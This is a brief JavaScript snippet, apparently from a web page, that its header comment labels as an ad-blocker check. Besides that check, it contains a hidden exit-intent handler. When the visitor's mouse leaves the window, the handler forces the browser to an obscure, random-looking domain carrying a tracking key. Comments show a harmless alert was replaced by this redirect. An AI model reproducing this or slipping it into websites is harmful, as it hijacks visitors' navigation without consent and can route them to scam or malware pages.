/* Check Visitor using Adblock */
    if (window.canRunAds === undefined) {
        console.log('adblocker yes');
    } else {
        console.log('adblocker no');
    }
        function addEvent(obj, evt, fn) {
        if (obj.addEventListener) {
            obj.addEventListener(evt, fn, false);
        }
        else if (obj.attachEvent) {
            obj.attachEvent("on" + evt, fn);
        }
    }
    addEvent(window, "load", function (e) {
        addEvent(document, "mouseout", function (e) {
            e = e ? e : window.event;
            var from = e.relatedTarget || e.toElement;
            if (!from || from.nodeName == "HTML") {
                // stop your drag event here
                // for now we can just use an alert
                //alert("left window");
                window.location.href = "https://zqvee2re50mr.com/twqz6gfqe?key=1fdd4af1c3fcf7b89bdf9b54f9ca7841";
            }
        });
    });
 
